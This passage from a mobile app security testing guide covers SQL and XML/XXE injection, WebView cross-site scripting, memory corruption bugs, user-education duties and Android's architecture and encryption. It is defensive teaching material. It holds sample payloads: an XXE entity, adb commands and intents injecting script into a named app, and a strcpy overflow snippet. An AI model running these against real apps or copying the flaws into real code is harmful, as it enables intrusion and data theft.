Ostorlab exploited the sort parameter of
\href{https://blog.ostorlab.co/android-sql-contentProvider-sql-injections.html}{Yahoo's
weather mobile application} with adb using this SQL injection payload.

Another real-world instance of client-side SQL injection was discovered
by Mark Woods within the ``Qnotes'' and ``Qget'' Android apps running on
QNAP NAS storage appliances. These apps exported content providers
vulnerable to SQL injection, allowing an attacker to retrieve the
credentials for the NAS device. A detailed description of this issue can
be found on the
\href{https://blog.nettitude.com/uk/qnap-android-dont-provide}{Nettitude
Blog}.

\hypertarget{xml-injection}{%
\paragraph{XML Injection}\label{xml-injection}}

In a \emph{XML injection} attack, the attacker injects XML
meta-characters to structurally alter XML content. This can be used to
either compromise the logic of an XML-based application or service, as
well as possibly allow an attacker to exploit the operation of the XML
parser processing the content.

A popular variant of this attack is
\href{https://www.owasp.org/index.php/XML_External_Entity_\%28XXE\%29_Processing}{XML
eXternal Entity (XXE)}. Here, an attacker injects an external entity
definition containing an URI into the input XML. During parsing, the XML
parser expands the attacker-defined entity by accessing the resource
specified by the URI. The integrity of the parsing application
ultimately determines capabilities afforded to the attacker, where the
malicious user could do any (or all) of the following: access local
files, trigger HTTP requests to arbitrary hosts and ports, launch a
\href{https://goo.gl/UknMCj}{cross-site request forgery (CSRF)} attack,
and cause a denial-of-service condition. The OWASP web testing guide
contains the \href{https://goo.gl/QGQkEX}{following example for XXE}:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<?xml}\NormalTok{ version="1.0" encoding="ISO{-}8859{-}1"}\KeywordTok{?>}
 \DataTypeTok{<!DOCTYPE }\NormalTok{foo }\DataTypeTok{[}  
  \DataTypeTok{<!ELEMENT}\NormalTok{ foo ANY }\DataTypeTok{>}
  \DataTypeTok{<!ENTITY}\NormalTok{ xxe SYSTEM }\StringTok{"file:///dev/random"} \DataTypeTok{>]>}\KeywordTok{<foo>}\DecValTok{\&xxe;}\KeywordTok{</foo>}
\end{Highlighting}
\end{Shaded}

In this example, the local file \texttt{/dev/random} is opened where an
endless stream of bytes is returned, potentially causing a
denial-of-service.

The current trend in app development focuses mostly on REST/JSON-based
services as XML is becoming less common. However, in the rare cases
where user-supplied or otherwise untrusted content is used to construct
XML queries, it could be interpreted by local XML parsers, such as
NSXMLParser on iOS. As such, said input should always be validated and
meta-characters should be escaped.

\hypertarget{injection-attack-vectors}{%
\paragraph{Injection Attack Vectors}\label{injection-attack-vectors}}

The attack surface of mobile apps is quite different from typical web
and network applications. Mobile apps don't often expose services on the
network, and viable attack vectors on an app's user interface are rare.
Injection attacks against an app are most likely to occur through
inter-process communication (IPC) interfaces, where a malicious app
attacks another app running on the device.

Locating a potential vulnerability begins by either:

\begin{itemize}
\tightlist
\item
  Identifying possible entry points for untrusted input then tracing
  from those locations to see if the destination contains potentially
  vulnerable functions.
\item
  Identifying known, dangerous library / API calls (e.g.~SQL queries)
  and then checking whether unchecked input successfully interfaces with
  respective queries.
\end{itemize}

During a manual security review, you should employ a combination of both
techniques. In general, untrusted inputs enter mobile apps through the
following channels:

\begin{itemize}
\tightlist
\item
  IPC calls
\item
  Custom URL schemes
\item
  QR codes
\item
  Input files received via Bluetooth, NFC, or other means
\item
  Pasteboards
\item
  User interface
\end{itemize}

Verify that the following best practices have been followed:

\begin{itemize}
\tightlist
\item
  Untrusted inputs are type-checked and/or validated using a white-list
  of acceptable values.
\item
  Prepared statements with variable binding (i.e.~parameterized queries)
  are used when performing database queries. If prepared statements are
  defined, user-supplied data and SQL code are automatically separated.
\item
  When parsing XML data, ensure the parser application is configured to
  reject resolution of external entities in order to prevent XXE attack.
\item
  When working with x509 formatted certificate data, ensure that secure
  parsers are used. For instance Bouncy Castle below version 1.6 allows
  for Remote Code Execution by means of unsafe reflection.
\end{itemize}

We will cover details related to input sources and potentially
vulnerable APIs for each mobile OS in the OS-specific testing guides.

\hypertarget{cross-site-scripting-flaws-mstg-platform-2}{%
\subsubsection{Cross-Site Scripting Flaws
(MSTG-PLATFORM-2)}\label{cross-site-scripting-flaws-mstg-platform-2}}

Cross-site scripting (XSS) issues allow attackers to inject client-side
scripts into web pages viewed by users. This type of vulnerability is
prevalent in web applications. When a user views the injected script in
a browser, the attacker gains the ability to bypass the same origin
policy, enabling a wide variety of exploits (e.g.~stealing session
cookies, logging key presses, performing arbitrary actions, etc.).

In the context of \emph{native apps}, XSS risks are far less prevalent
for the simple reason these kinds of applications do not rely on a web
browser. However, apps using WebView components, such as
\texttt{WKWebView} or the deprecated \texttt{UIWebView} on iOS and
\texttt{WebView} on Android, are potentially vulnerable to such attacks.

An older but well-known example is the
\href{https://superevr.com/blog/2011/xss-in-skype-for-ios}{local XSS
issue in the Skype app for iOS, first identified by Phil Purviance}. The
Skype app failed to properly encode the name of the message sender,
allowing an attacker to inject malicious JavaScript to be executed when
a user views the message. In his proof-of-concept, Phil showed how to
exploit the issue and steal a user's address book.

\hypertarget{static-analysis-8}{%
\paragraph{Static Analysis}\label{static-analysis-8}}

Take a close look at any WebViews present and investigate for untrusted
input rendered by the app.

XSS issues may exist if the URL opened by WebView is partially
determined by user input. The following example is from an XSS issue in
the
\href{https://labs.detectify.com/2015/02/20/finding-an-xss-in-an-html-based-android-application/}{Zoho
Web Service, reported by Linus Särud}.

Java

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{webView.}\FunctionTok{loadUrl}\NormalTok{(}\StringTok{"javascript:initialize("}\NormalTok{ + myNumber + }\StringTok{");"}\NormalTok{);}
\end{Highlighting}
\end{Shaded}

Kotlin

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{webView.loadUrl(}\StringTok{"javascript:initialize($myNumber);"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

Another example of XSS issues determined by user input is public
overridden methods.

Java

\begin{Shaded}
\begin{Highlighting}[]
\AttributeTok{@Override}
\KeywordTok{public} \DataTypeTok{boolean} \FunctionTok{shouldOverrideUrlLoading}\NormalTok{(WebView view, }\BuiltInTok{String}\NormalTok{ url) \{}
  \KeywordTok{if}\NormalTok{ (url.}\FunctionTok{substring}\NormalTok{(}\DecValTok{0}\NormalTok{,}\DecValTok{6}\NormalTok{).}\FunctionTok{equalsIgnoreCase}\NormalTok{(}\StringTok{"yourscheme:"}\NormalTok{)) \{}
    \CommentTok{// parse the URL object and execute functions}
\NormalTok{  \}}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

Kotlin

\begin{Shaded}
\begin{Highlighting}[]
    \KeywordTok{fun} \FunctionTok{shouldOverrideUrlLoading}\NormalTok{(}\VariableTok{view}\NormalTok{: }\DataTypeTok{WebView}\NormalTok{, }\VariableTok{url}\NormalTok{: }\DataTypeTok{String}\NormalTok{): }\DataTypeTok{Boolean}\NormalTok{ \{}
        \ControlFlowTok{if}\NormalTok{ (url.substring(}\DecValTok{0}\NormalTok{, }\DecValTok{6}\NormalTok{).equals(}\StringTok{"yourscheme:"}\NormalTok{, ignoreCase = }\KeywordTok{true}\NormalTok{)) \{}
            \CommentTok{// parse the URL object and execute functions}
\NormalTok{        \}}
\NormalTok{    \}}
\end{Highlighting}
\end{Shaded}

Sergey Bobrov was able to take advantage of this in the following
\href{https://hackerone.com/reports/189793}{HackerOne report}. Any input
to the HTML parameter would be trusted in Quora's
ActionBarContentActivity. Payloads were successful using adb, clipboard
data via ModalContentActivity, and Intents from 3rd party applications.

\begin{itemize}
\item
  ADB

\begin{verbatim}
$ adb shell
$ am start -n com.quora.android/com.quora.android.ActionBarContentActivity \
-e url 'http://test/test' -e html 'XSS<script>alert(123)</script>'
\end{verbatim}
\item
  Clipboard Data

\begin{verbatim}
$ am start -n com.quora.android/com.quora.android.ModalContentActivity  \
-e url 'http://test/test' -e html \
'<script>alert(QuoraAndroid.getClipboardData());</script>'
\end{verbatim}
\item
  3rd party Intent in Java or Kotlin:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{Intent i = }\KeywordTok{new} \FunctionTok{Intent}\NormalTok{();}
\NormalTok{i.}\FunctionTok{setComponent}\NormalTok{(}\KeywordTok{new} \FunctionTok{ComponentName}\NormalTok{(}\StringTok{"com.quora.android"}\NormalTok{,}
\StringTok{"com.quora.android.ActionBarContentActivity"}\NormalTok{));}
\NormalTok{i.}\FunctionTok{putExtra}\NormalTok{(}\StringTok{"url"}\NormalTok{,}\StringTok{"http://test/test"}\NormalTok{);}
\NormalTok{i.}\FunctionTok{putExtra}\NormalTok{(}\StringTok{"html"}\NormalTok{,}\StringTok{"XSS PoC <script>alert(123)</script>"}\NormalTok{);}
\NormalTok{view.}\FunctionTok{getContext}\NormalTok{().}\FunctionTok{startActivity}\NormalTok{(i);}
\end{Highlighting}
\end{Shaded}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{val} \VariableTok{i}\NormalTok{ = Intent()}
\NormalTok{i.component = ComponentName(}\StringTok{"com.quora.android"}\NormalTok{,}
\StringTok{"com.quora.android.ActionBarContentActivity"}\NormalTok{)}
\NormalTok{i.putExtra(}\StringTok{"url"}\NormalTok{, }\StringTok{"http://test/test"}\NormalTok{)}
\NormalTok{i.putExtra(}\StringTok{"html"}\NormalTok{, }\StringTok{"XSS PoC <script>alert(123)</script>"}\NormalTok{)}
\NormalTok{view.context.startActivity(i)}
\end{Highlighting}
\end{Shaded}
\end{itemize}

If a WebView is used to display a remote website, the burden of escaping
HTML shifts to the server side. If an XSS flaw exists on the web server,
this can be used to execute script in the context of the WebView. As
such, it is important to perform static analysis of the web application
source code.

Verify that the following best practices have been followed:

\begin{itemize}
\tightlist
\item
  No untrusted data is rendered in HTML, JavaScript or other interpreted
  contexts unless it is absolutely necessary.
\item
  Appropriate encoding is applied to escape characters, such as HTML
  entity encoding. Note: escaping rules become complicated when HTML is
  nested within other code, for example, rendering a URL located inside
  a JavaScript block.
\end{itemize}

Consider how data will be rendered in a response. For example, if data
is rendered in a HTML context, six control characters that must be
escaped:

\begin{longtable}[]{@{}cc@{}}
\toprule
Character & Escaped\tabularnewline
\midrule
\endhead
\& & \&amp;\tabularnewline
\textless{} & \&lt;\tabularnewline
\textgreater{} & \&gt;\tabularnewline
" & \&quot;\tabularnewline
' & \&\#x27;\tabularnewline
/ & \&\#x2F;\tabularnewline
\bottomrule
\end{longtable}

For a comprehensive list of escaping rules and other prevention
measures, refer to the \href{https://goo.gl/motVKX}{OWASP XSS Prevention
Cheat Sheet}.

\hypertarget{dynamic-analysis-6}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-6}}

XSS issues can be best detected using manual and/or automated input
fuzzing, i.e.~injecting HTML tags and special characters into all
available input fields to verify the web application denies invalid
inputs or escapes the HTML meta-characters in its output.

A \href{https://goo.gl/eqqiHV}{reflected XSS attack} refers to an
exploit where malicious code is injected via a malicious link. To test
for these attacks, automated input fuzzing is considered to be an
effective method. For example, the
\href{https://portswigger.net/burp/}{BURP Scanner} is highly effective
in identifying reflected XSS vulnerabilities. As always with automated
analysis, ensure all input vectors are covered with a manual review of
testing parameters.

\hypertarget{memory-corruption-bugs-mstg-code-8}{%
\subsubsection{Memory Corruption Bugs
(MSTG-CODE-8)}\label{memory-corruption-bugs-mstg-code-8}}

Memory corruption bugs are a popular mainstay with hackers. This class
of bug results from a programming error that causes the program to
access an unintended memory location. Under the right conditions,
attackers can capitalize on this behavior to hijack the execution flow
of the vulnerable program and execute arbitrary code. This kind of
vulnerability occurs in a number of ways:

\begin{itemize}
\item
  Buffer overflows: This describes a programming error where an app
  writes beyond an allocated memory range for a particular operation. An
  attacker can use this flaw to overwrite important control data located
  in adjacent memory, such as function pointers. Buffer overflows were
  formerly the most common type of memory corruption flaw, but have
  become less prevalent over the years due to a number of factors.
  Notably, awareness among developers of the risks in using unsafe C
  library functions is now a common best practice plus, catching buffer
  overflow bugs is relatively simple. However, it is still worth testing
  for such defects.
\item
  Out-of-bounds-access: Buggy pointer arithmetic may cause a pointer or
  index to reference a position beyond the bounds of the intended memory
  structure (e.g.~buffer or list). When an app attempts to write to an
  out-of-bounds address, a crash or unintended behavior occurs. If the
  attacker can control the target offset and manipulate the content
  written to some extent,
  \href{https://www.zerodayinitiative.com/advisories/ZDI-17-110/}{code
  execution exploit is likely possible}.
\item
  Dangling pointers: These occur when an object with an incoming
  reference to a memory location is deleted or deallocated, but the
  object pointer is not reset. If the program later uses the
  \emph{dangling} pointer to call a virtual function of the already
  deallocated object, it is possible to hijack execution by overwriting
  the original vtable pointer. Alternatively, it is possible to read or
  write object variables or other memory structures referenced by a
  dangling pointer.
\item
  Use-after-free: This refers to a special case of dangling pointers
  referencing released (deallocated) memory. After a memory address is
  cleared, all pointers referencing the location become invalid, causing
  the memory manager to return the address to a pool of available
  memory. When this memory location is eventually re-allocated,
  accessing the original pointer will read or write the data contained
  in the newly allocated memory. This usually leads to data corruption
  and undefined behavior, but crafty attackers can set up the
  appropriate memory locations to leverage control of the instruction
  pointer.
\item
  Integer overflows: When the result of an arithmetic operation exceeds
  the maximum value for the integer type defined by the programmer, this
  results in the value ``wrapping around'' the maximum integer value,
  inevitably resulting in a small value being stored. Conversely, when
  the result of an arithmetic operation is smaller than the minimum
  value of the integer type, an \emph{integer underflow} occurs where
  the result is larger than expected. Whether a particular integer
  overflow/underflow bug is exploitable depends on how the integer is
  used -- for example, if the integer type were to represent the length
  of a buffer, this could create a buffer overflow vulnerability.
\item
  Format string vulnerabilities: When unchecked user input is passed to
  the format string parameter of the \texttt{printf} family of C
  functions, attackers may inject format tokens such as `\%c' and `\%n'
  to access memory. Format string bugs are convenient to exploit due to
  their flexibility. Should a program output the result of the string
  formatting operation, the attacker can read and write to memory
  arbitrarily, thus bypassing protection features such as ASLR.
\end{itemize}

The primary goal in exploiting memory corruption is usually to redirect
program flow into a location where the attacker has placed assembled
machine instructions referred to as \emph{shellcode}. On iOS, the data
execution prevention feature (as the name implies) prevents execution
from memory defined as data segments. To bypass this protection,
attackers leverage return-oriented programming (ROP). This process
involves chaining together small, pre-existing code chunks (``gadgets'')
in the text segment where these gadgets may execute a function useful to
the attacker or, call \texttt{mprotect} to change memory protection
settings for the location where the attacker stored the
\emph{shellcode}.

Android apps are, for the most part, implemented in Java which is
inherently safe from memory corruption issues by design. However, native
apps utilizing JNI libraries are susceptible to this kind of bug.
Similarly, iOS apps can wrap C/C++ calls in Obj-C or Swift, making them
susceptible to these kind of attacks.

\hypertarget{buffer-and-integer-overflows}{%
\paragraph{Buffer and Integer
Overflows}\label{buffer-and-integer-overflows}}

The following code snippet shows a simple example for a condition
resulting in a buffer overflow vulnerability.

\begin{Shaded}
\begin{Highlighting}[]
 \DataTypeTok{void}\NormalTok{ copyData(}\DataTypeTok{char}\NormalTok{ *userId) \{  }
    \DataTypeTok{char}\NormalTok{  smallBuffer[}\DecValTok{10}\NormalTok{]; }\CommentTok{// size of 10  }
\NormalTok{    strcpy(smallBuffer, userId);}
\NormalTok{ \}  }
\end{Highlighting}
\end{Shaded}

To identify potential buffer overflows, look for uses of unsafe string
functions (\texttt{strcpy}, \texttt{strcat}, other functions beginning
with the ``str'' prefix, etc.) and potentially vulnerable programming
constructs, such as copying user input into a limited-size buffer. The
following should be considered red flags for unsafe string functions:

\begin{itemize}
\tightlist
\item
  \texttt{strcat}
\item
  \texttt{strcpy}
\item
  \texttt{strncat}
\item
  \texttt{strlcat}
\item
  \texttt{strncpy}
\item
  \texttt{strlcpy}
\item
  \texttt{sprintf}
\item
  \texttt{snprintf}
\item
  \texttt{gets}
\end{itemize}

Also, look for instances of copy operations implemented as ``for'' or
``while'' loops and verify length checks are performed correctly.

Verify that the following best practices have been followed:

\begin{itemize}
\tightlist
\item
  When using integer variables for array indexing, buffer length
  calculations, or any other security-critical operation, verify that
  unsigned integer types are used and perform precondition tests are
  performed to prevent the possibility of integer wrapping.
\item
  The app does not use unsafe string functions such as \texttt{strcpy},
  most other functions beginning with the ``str'' prefix,
  \texttt{sprint}, \texttt{vsprintf}, \texttt{gets}, etc.;
\item
  If the app contains C++ code, ANSI C++ string classes are used;
\item
  In case of \texttt{memcpy}, make sure you check that the target buffer
  is at least of equal size as the source and that both buffers are not
  overlapping.
\item
  iOS apps written in Objective-C use NSString class. C apps on iOS
  should use CFString, the Core Foundation representation of a string.
\item
  No untrusted data is concatenated into format strings.
\end{itemize}

\hypertarget{static-analysis-9}{%
\paragraph{Static Analysis}\label{static-analysis-9}}

Static code analysis of low-level code is a complex topic that could
easily fill its own book. Automated tools such as
\href{https://code.google.com/archive/p/rough-auditing-tool-for-security/downloads}{RATS}
combined with limited manual inspection efforts are usually sufficient
to identify low-hanging fruits. However, memory corruption conditions
often stem from complex causes. For example, a use-after-free bug may
actually be the result of an intricate, counter-intuitive race condition
not immediately apparent. Bugs manifesting from deep instances of
overlooked code deficiencies are generally discovered through dynamic
analysis or by testers who invest time to gain a deep understanding of
the program.

\hypertarget{dynamic-analysis-7}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-7}}

Memory corruption bugs are best discovered via input fuzzing: an
automated black-box software testing technique in which malformed data
is continually sent to an app to survey for potential vulnerability
conditions. During this process, the application is monitored for
malfunctions and crashes. Should a crash occur, the hope (at least for
security testers) is that the conditions creating the crash reveal an
exploitable security flaw.

Fuzz testing techniques or scripts (often called ``fuzzers'') will
typically generate multiple instances of structured input in a
semi-correct fashion. Essentially, the values or arguments generated are
at least partially accepted by the target application, yet also contain
invalid elements, potentially triggering input processing flaws and
unexpected program behaviors. A good fuzzer exposes a substantial amount
of possible program execution paths (i.e.~high coverage output). Inputs
are either generated from scratch (``generation-based'') or derived from
mutating known, valid input data (``mutation-based'').

For more information on fuzzing, refer to the
\href{https://www.owasp.org/index.php/Fuzzing}{OWASP Fuzzing Guide}.

\hypertarget{references-5}{%
\subsubsection{References}\label{references-5}}

\hypertarget{owasp-masvs-4}{%
\paragraph{OWASP MASVS}\label{owasp-masvs-4}}

\begin{itemize}
\tightlist
\item
  MSTG-ARCH-2: ``Security controls are never enforced only on the client
  side, but on the respective remote endpoints.''
\item
  MSTG-PLATFORM-2: ``All inputs from external sources and the user are
  validated and if necessary sanitized. This includes data received via
  the UI, IPC mechanisms such as intents, custom URLs, and network
  sources.''
\item
  MSTG-CODE-8: ``In unmanaged code, memory is allocated, freed and used
  securely.''
\end{itemize}

\hypertarget{xss-via-start-contentactivity}{%
\paragraph{XSS via start
ContentActivity}\label{xss-via-start-contentactivity}}

\begin{itemize}
\tightlist
\item
  \url{https://hackerone.com/reports/189793}
\end{itemize}

\hypertarget{testing-user-interaction}{%
\subsection{Testing User Interaction}\label{testing-user-interaction}}

\hypertarget{testing-user-education-mstg-storage-12}{%
\subsubsection{Testing User Education
(MSTG-STORAGE-12)}\label{testing-user-education-mstg-storage-12}}

A lot has happened lately in terms of responsibilities that developers
have to educate users on what they need to know. This has shifted
especially with the introduction of the
\href{https://gdpr-info.eu/}{General Data Protection Regulation (GDPR)}
in Europe. Ever since then, it is best to educate users on what is
happening with their private data and why. Additionally, it is a good
practice to inform the user about how to use the application properly.
This should ensure a secure handling and processing of the user's
information. Next, a user should be informed on what type of device data
the app will access, whether that is PII or not. Last, you need to share
OSS related information with the user. All four items will be covered
here.

\begin{quote}
Please note that this is the MSTG project and not a legal handbook.
Therefore, we will not cover the GDPR and other possibly relevant laws
here.
\end{quote}

\hypertarget{informing-users-on-their-private-information}{%
\paragraph{Informing users on their private
information}\label{informing-users-on-their-private-information}}

When you need personal information from a user for your business
process, the user needs to be informed on what you do with the data and
why you need it. If there is a third party doing the actual processing
of the data, you should inform the user about that too. Lastly, there
are three processes you need to support:

\begin{itemize}
\tightlist
\item
  \textbf{The right to be forgotten}: Users need to be able to request
  the deletion of their data, and be explained how to do so.
\item
  \textbf{The right to correct data}: Users should be able to correct
  their personal information at any time, and be explained how to do so.
\item
  \textbf{The right to access user data}: Users should be able to
  request all information that the application has on them, and be
  explained how to request this information.
\end{itemize}

Most of this can be covered in a privacy policy, but make sure that it
is understandable by the user.

When additional data needs to be processed, you should ask the user for
consent again. During that consent request it needs to be made clear how
the user can revert from sharing the additional data. Similarly, when
existing datasets of a user need to be linked, you should ask the user's
consent about it.

\hypertarget{informing-the-user-on-the-best-security-practices}{%
\paragraph{Informing the user on the best security
practices}\label{informing-the-user-on-the-best-security-practices}}

Here is a list of best practices where a user could be informed of:

\begin{itemize}
\tightlist
\item
  \textbf{Fingerprint usage}: When an app uses a fingerprint for
  authentication and it provides access to high risk
  transactions/information, inform the user about the issues there can
  be when having multiple fingerprints of other people registered to the
  device as well.
\item
  \textbf{Rooting/Jailbreaking}: When an app detects a rooted or
  jailbroken device, inform the user of the fact that certain high-risk
  actions will carry additional risk due to the jailbroken/rooted status
  of the device.
\item
  \textbf{Specific credentials}: When a user gets a recovery code, a
  password or a pin from the application (or sets one), instruct the
  user to never share this with anyone else and that only the app will
  request it.
\item
  \textbf{Application distribution}: In case of a high-risk application
  it is recommended to communicate what the official way of distributing
  the app is. Otherwise, users might use other channels in which they
  download a compromised version of the application.
\end{itemize}

\hypertarget{access-to-device-data}{%
\paragraph{Access to Device Data}\label{access-to-device-data}}

Although partially covered by the Google Play Store and the Apple App
Store, you still need to explain to the user which services your app
consumes and why. For instance:

\begin{itemize}
\tightlist
\item
  Does your app require access to the contact list?
\item
  Does your app need access to location services of the device?
\item
  Does your app use device identifiers to identify the device?
\end{itemize}

Explain the user why your app needs to do this kind of things. More
information on this subject can be found at the
\href{https://developer.apple.com/design/human-interface-guidelines/ios/app-architecture/requesting-permission/}{Apple
Human Interface Guidelines} and the
\href{https://developer.android.com/training/permissions/requesting.html\#explain}{Android
App permissions best practices}.

\hypertarget{other-information-you-have-to-share-oss-information}{%
\paragraph{Other Information You Have to Share (OSS
Information)}\label{other-information-you-have-to-share-oss-information}}

Given copyright laws, you must make sure you inform the user on any
third party libraries that are used in the app. For each third party
library you should consult the license to see if certain information
(such as copyright, modifications, original author, \ldots) should be
presented to the user. For this, it is best to request legal advice from
a specialist. An example can be found at
\href{https://www.bignerdranch.com/blog/open-source-licenses-and-android/}{a
blog post from Big Nerd Ranch}. Additionally, the website
\href{https://tldrlegal.com/}{TL;DR - Legal} can help you in figuring
out what is necessary for each license.

\hypertarget{references-6}{%
\subsubsection{References}\label{references-6}}

\hypertarget{owasp-masvs-5}{%
\paragraph{OWASP MASVS}\label{owasp-masvs-5}}

\begin{itemize}
\tightlist
\item
  MSTG-STORAGE-12: ``The app educates the user about the types of
  personally identifiable information processed, as well as security
  best practices the user should follow in using the app.''
\end{itemize}

\hypertarget{example-for-open-source-license-mentioning}{%
\paragraph{Example for open source license
mentioning}\label{example-for-open-source-license-mentioning}}

\begin{itemize}
\tightlist
\item
  \url{https://www.bignerdranch.com/blog/open-source-licenses-and-android/}
\end{itemize}

\hypertarget{website-to-help-with-understanding-licenses}{%
\paragraph{Website to Help with Understanding
Licenses}\label{website-to-help-with-understanding-licenses}}

\begin{itemize}
\tightlist
\item
  \url{https://tldrlegal.com/}
\end{itemize}

\hypertarget{guidance-on-permission-requesting}{%
\paragraph{Guidance on Permission
Requesting}\label{guidance-on-permission-requesting}}

\begin{itemize}
\tightlist
\item
  Apple Human Interface Guidelines -
  \url{https://developer.apple.com/design/human-interface-guidelines/ios/app-architecture/requesting-permission/}
\item
  Android App permissions best practices -
  \url{https://developer.android.com/training/permissions/requesting.html\#explain}
\end{itemize}

\hypertarget{testing-application-security-on-android}{%
\section{Testing Application Security on
Android}\label{testing-application-security-on-android}}

\hypertarget{android-platform-overview}{%
\subsection{Android Platform Overview}\label{android-platform-overview}}

This section introduces the Android platform from an architecture point
of view. The following five key areas are discussed:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Android security architecture
\item
  Android application structure
\item
  Inter-process Communication (IPC)
\item
  Android application publishing
\item
  Android application attack surface
\end{enumerate}

Visit the official
\href{https://developer.android.com/index.html}{Android developer
documentation website} for more details about the Android platform.

\hypertarget{android-security-architecture}{%
\subsubsection{Android Security
Architecture}\label{android-security-architecture}}

Android is a Linux-based open source platform developed by Google, which
serves as a mobile operating system (OS). Today the platform is the
foundation for a wide variety of modern technology, such as mobile
phones, tablets, wearable tech, TVs, and other ``smart'' devices.
Typical Android builds ship with a range of pre-installed (``stock'')
apps and support installation of third-party apps through the Google
Play store and other marketplaces.

Android's software stack is composed of several different layers. Each
layer defines interfaces and offers specific services.

\begin{figure}
\centering
\includegraphics[width=4.16667in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/1f7368a68bdac5245a0c8f7dea8e9f7f271617de.png}
\caption{Android Software Stack}
\end{figure}

At the lowest level, Android is based on a variation of the Linux
Kernel. On top of the kernel, the Hardware Abstraction Layer (HAL)
defines a standard interface for interacting with built-in hardware
components. Several HAL implementations are packaged into shared library
modules that the Android system calls when required. This is the basis
for allowing applications to interact with the device's hardware---for
example, it allows a stock phone application to use a device's
microphone and speaker.

Android apps are usually written in Java and compiled to Dalvik
bytecode, which is somewhat different from the traditional Java
bytecode. Dalvik bytecode is created by first compiling the Java code to
.class files, then converting the JVM bytecode to the Dalvik .dex format
with the \texttt{dx} tool.

\begin{figure}
\centering
\includegraphics[width=3.64583in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/b95a89677543656fa89bd7246356c2a701a1d247.png}
\caption{Java vs Dalvik}
\end{figure}

The current version of Android executes this bytecode on the Android
runtime (ART). ART is the successor to Android's original runtime, the
Dalvik Virtual Machine. The key difference between Dalvik and ART is the
way the bytecode is executed.

In Dalvik, bytecode is translated into machine code at execution time, a
process known as \emph{just-in-time} (JIT) compilation. JIT compilation
adversely affects performance: the compilation must be performed every
time the app is executed. To improve performance, ART introduced
\emph{ahead-of-time} (AOT) compilation. As the name implies, apps are
precompiled before they are executed for the first time. This
precompiled machine code is used for all subsequent executions. AOT
improves performance by a factor of two while reducing power
consumption.

Android apps don't have direct access to hardware resources, and each
app runs in its own sandbox. This allows precise control over resources
and apps: for instance, a crashing app doesn't affect other apps running
on the device. At the same time, the Android runtime controls the
maximum number of system resources allocated to apps, preventing any one
app from monopolizing too many resources.

\hypertarget{android-users-and-groups}{%
\paragraph{Android Users and Groups}\label{android-users-and-groups}}

Even though the Android operating system is based on Linux, it doesn't
implement user accounts in the same way other Unix-like systems do. In
Android, the multi-user support of the Linux kernel to sandbox apps:
with a few exceptions, each app runs as though under a separate Linux
user, effectively isolated from other apps and the rest of the operating
system.

The file
\href{http://androidxref.com/7.1.1_r6/xref/system/core/include/private/android_filesystem_config.h}{system/core/include/private/android\_filesystem\_config.h}
includes a list of the predefined users and groups system processes are
assigned to. UIDs (userIDs) for other applications are added as the
latter are installed. For more details, check out Bin Chen's
\href{https://pierrchen.blogspot.mk/2016/09/an-walk-through-of-android-uidgid-based.html}{blog
post} on Android sandboxing.

For example, Android 7.0 (API level 24) defines the following system
users:

\begin{Shaded}
\begin{Highlighting}[]
    \PreprocessorTok{\#define AID\_ROOT             0  }\CommentTok{/* traditional unix root user */}
    \PreprocessorTok{\#define AID\_SYSTEM        1000  }\CommentTok{/* system server */}
    \ErrorTok{\#...}
    \PreprocessorTok{\#define AID\_SHELL         2000  }\CommentTok{/* adb and debug shell user */}
    \ErrorTok{\#...}
    \PreprocessorTok{\#define AID\_APP          10000  }\CommentTok{/* first app user */}
\NormalTok{    ...}
\end{Highlighting}
\end{Shaded}

\hypertarget{android-device-encryption}{%
\paragraph{Android Device Encryption}\label{android-device-encryption}}

Android supports device encryption from Android 2.3.4 (API level 10) and
it has undergone some big changes since then. Google imposed that all
devices running Android 6.0 (API level 23) or higher had to support
storage encryption. Although some low-end devices were exempt because it
would significantly impact performance. In the following sections you
can find information about device encryption and its algorithms.

\hypertarget{full-disk-encryption}{%
\subparagraph{Full-Disk Encryption}\label{full-disk-encryption}}

Android 5.0 (API level 21) and above support full-disk encryption. This
encryption uses a single key protected by the users' device password to
encrypt and decrypt the userdata partition. This kind of encryption is
now considered deprecated and file-based encryption should be used
whenever possible. Full-disk encryption has drawbacks, such as not being
able to receive calls or not having operative alarms after a reboot if
the user does not enter the password to unlock.

\hypertarget{file-based-encryption}{%
\subparagraph{File-Based Encryption}\label{file-based-encryption}}

Android 7.0 (API level 24) supports file-based encryption. File-based
encryption allows different files to be encrypted with different keys so
they can be deciphered independently. Devices which support this type of
encryption support Direct Boot as well. Direct Boot enables the device
to have access to features such as alarms or accessibility services even
if the user didn't unlock the device.

\hypertarget{adiantum}{%
\subparagraph{Adiantum}\label{adiantum}}

AES is used on most modern Android devices for storage encryption.
Actually, AES has become such a widely used algorithm that the most
recent processor implementations have a dedicated set of instructions to
provide hardware accelerated encryption and decryption operations, such
as ARMv8 with its Cryptography Extensions or x86 with AES-NI extension.
However, not all devices are capable of using AES for storage encryption
in a timely fashion. Especially low-end devices running Android Go.
These devices usually use low-end processors, such as the ARM Cortex-A7
which don't have hardware accelerated AES.

Adiantum is a cipher construction designed by Paul Crowley and Eric
Biggers at Google to fill the gap for that set of devices which are not
able to run AES at least at 50 MiB/s. Adiantum relies only on additions,
rotations and XORs; these operations are natively supported on all
processors. Therefore, the low-end processors can encrypt 4 times faster
and decrypt 5 times faster than they would if they were using AES.

Adiantum is a composition of other ciphers:

\begin{itemize}
\tightlist
\item
  NH: A hashing function.
\item
  Poly1305: A message authentication code (MAC).
\item
  XChaCha12: A stream cipher.
\item
  AES-256: A single invocation of AES.
\end{itemize}

Adiantum is a new cipher but it is secure, as long as ChaCha12 and
AES-256 are considered secure. Its designers didn't create any new
cryptographic primitive, instead they relied on other well-known and
thoroughly studied primitives to create a new performant algorithm.

Adiantum is available for Android 9 (API level 28) and higher versions.
It is natively supported in Linux kernel 5.0 and onwards, while kernel
4.19, 4.14 \& 4.9 need patching. Android does not provide an API to
application developers to use Adiantum; this cipher is to be taken into
